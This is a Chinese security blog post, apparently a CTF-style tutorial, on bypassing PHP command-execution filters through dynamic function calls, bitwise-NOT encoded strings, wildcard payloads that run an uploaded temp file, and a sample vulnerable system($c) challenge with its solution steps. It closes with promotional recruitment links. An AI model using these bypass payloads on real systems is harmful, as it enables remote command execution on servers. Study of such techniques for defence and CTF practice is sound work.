#  命令执行：突破Shell命令过滤限制  
原创 油漆工
                    油漆工  C4安全   2026-03-25 08:33  
  
在Web安全领域，命令执行漏洞是常见的高危漏洞之一。然而，现代Web应用通常会对用户输入进行严格的过滤，防止恶意命令执行。本文将介绍PHP突破Shell命令过滤限制的技术方法。  
  
动态函数执行  
  
在PHP7及以上版本中，允许使用   
($a)();  
 这样的语法来执行动态函数。这种方式的巧妙之处在于，括号内的函数名可以被替换，从而绕过一些简单的字符串过滤。  
  
例如，如果目标系统过滤了特定的函数名，我们可以通过变量赋值的方式，先将函数名存储在变量中，再通过动态函数调用的方式执行。  
  
不可见字符的利用  
  
现在存在一些无法在浏览器和页面正常显示的字符，这些字符可以被用来进行取反操作，从而得到正常的 [a-Z] 字母。  
  
这种技术的核心思路是：利用URL编码后的特殊字符，通过取反操作得到可打印的字母。例如：  
  
​  
  
```
<?phpecho urldecode('%8F%97%8F%96%91%99%90');echo "\n";echo ~(urldecode('%8F%97%8F%96%91%99%90'));echo "\n";echo urlencode(~('phpinfo'));?>
```  
  
  
​  
  
通过这种方式，即使目标系统过滤了字母和数字，我们仍然可以构造出可执行的PHP代码。  
  
​  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/niasx7fyic9CPN4lgBsicmeqAsDf2O6djFhOBI2Espg17HUdeSA6NicvZdJI1MBYAqpic0zTNMmML8E9zm3dJTSQbB19o8MJoz9AebXnzrFcU3VY/640?wx_fmt=jpeg&from=appmsg "")  
  
无字母数字的Shell命令  
  
如何利用无字母、数字、$的系统命令来组成命令，突破过滤？这里参考了P神的博客以及另一位安全研究者的分享。  
  
Shell脚本有一个重要的特性：必须以   
#!/bin/sh  
 开始。  
#! /bin/sh  
 表示此脚本使用   
/bin/sh  
 来解释执行，  
#!  
 是特殊的表示符，其后面跟的是解释此脚本的shell的路径。  
  
一个最简单的Shell脚本大致是这样的：  
  
```
#!/bin/sh
ls
```  
  
  
​  
  
文件后缀名通常为   
.php  
，但实际上Shell脚本的执行不依赖于后缀名，而是依赖于文件内容的开头标识。  
  
​  
  
文件上传与临时文件利用  
  
如果题目不能直接POST文件，需要自己编写一个可以POST PHP文件的网页。一个简单的文件上传页面大致如下：  
  
```
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>POST文件上传</title>
</head>
<body>
<form action="http://target-url/" method="post" enctype="multipart/form-data">
 <label for="file">文件名：</label>
 <input type="file" name="file" id="file"><br>
 <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```  
  
  
​  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/niasx7fyic9CMKxdY2Cpgcn1l4pjUV5ThCMNuMZiaVj4wjgthaBbkAZ2YBJ69LJmaZUnhUCvsFCScibwc5tTnwGLJMawIvexCZImpGCQT66Uwrw/640?wx_fmt=jpeg&from=appmsg "")  
  
在利用上传的文件执行命令时，需要了解几个关键点：  
1. 上传的文件会被保存在一个临时文件中  
  
1. 可以用通配符来猜测（匹配）这个临时文件夹的名称，使用   
?  
 是最有效的  
  
1. 临时文件通常不止一个，需要精确找到目标文件  
  
1. 目标文件通常保存在结尾有大写字母的临时文件里面，且唯一  
  
想明白这些思路以后，就能构造正确的payload。  
  
​  
  
Payload构造与执行  
  
如果想执行文件，通过GET或者POST传的参数部分需要按以下格式：  
  
```
. file
```  
  
  
注意中间存在空格，意思是使用bash命令执行file文件中的命令。  
  
因此，安全研究者构造了这样的payload：  
  
```
.%20/???/????????[@-[]
```  
  
  
传参以后能够执行上传的shell脚本。有时候也存在生成临时文件不是大写字母结尾的情况，需要多试几次。  
  
实例分析  
  
来看一个具体的CTF例题：  
  
```
<?php

if(isset($_GET['c'])){
 $c=$_GET['c'];
 if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
 system($c);
 }
}else{
 highlight_file(__FILE__);
}
```  
  
  
​  
  
这个过滤规则非常严格：  
- 禁止分号   
;  
  
- 禁止所有字母   
[a-z]  
  
- 禁止所有数字   
[0-9]  
  
- 禁止美元符号   
$  
  
- 禁止括号   
(  
、  
{  
  
- 禁止引号   
'  
、  
"  
  
- 禁止反引号   
`  
  
- 禁止百分号   
%  
  
- 禁止制表符   
\x09  
  
- 禁止和号   
\x26  
  
- 禁止大于号   
>  
  
- 禁止小于号   
<  
  
在这种情况下，常规的命令执行方式完全失效。这时候就需要用到前面介绍的几种技术组合。  
  
​  
  
解题思路：  
1. 提前开启BP拦截包  
  
1. 改包后send  
  
1. 在文件上传的同一时刻执行ls命令  
  
1. 同理得到flag  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/niasx7fyic9CPf0zyIM2icnhY3MRI5d0YGFibPcZJmrwKmN4432yAWuKQ3yVVgTU1kw91RBGjbQAwDsRIEkgEarBlHyyibBlbibib1OFjZ8aaP6daQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
总结  
  
突破Shell命令过滤限制是一个需要创造性思维的过程。本文介绍的几种方法各有特点：  
  
-   
动态函数执行  
：利用PHP语言特性绕过简单过滤  
  
-   
不可见字符利用  
：通过编码和取反构造可执行代码  
  
-   
无字母数字Shell  
：利用Shell脚本特性和通配符  
  
-   
临时文件利用  
：通过文件上传和临时文件名猜测  
  
​  
  
在实际的安全测试中，往往需要将多种技术组合使用，才能成功突破目标系统的防御。同时，这些技术也提醒开发者：安全防御需要多层防护，单一的过滤规则往往可以被绕过。  
  
​  
  
本文参考资料：  
- P神博客：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html  
  
- NPFS博客：https://www.cnblogs.com/NPFS/p/13797436.html  
  
- CSDN博客：https://blog.csdn.net/qq_36501591/article/details/87363747  
  
  
  
​  
  
感兴趣的师傅可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
**安全渗透感知大家族**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9COP0dhPpvfwgOcsxvlLjHJ2FX0P9eib559uqEBMoejSqLYg9HUflsBfXibwMCJU9wjhp9qqSIgsAXqWErLc2FtK6nPsO7rqb9yjk/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=13 "")  
  
****  
（新人优惠券折扣  
20.0  
￥，扫码即可领取更多优惠）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9CPicQX8MHjzewMCRYluC7bDzVnAC75SsLS6G5u6Qk43icTuN7CwbIz2rKmPZibhCIANfpjYESLa3iaic5ibXe2DhfFvlGgKQA4XIsGlI/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=6 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/niasx7fyic9COCkUfSeoNxUnEOKvzLL2yNgR3GuDASvdBuDuCBuHGibv8c6cmn5eBe4g5wCoK2I67arXsyPDMjluHp7y9SbAmhfvjoqqVoDTZY/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=15 "")  
  
****  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可**  
  
****  
END  
  
  
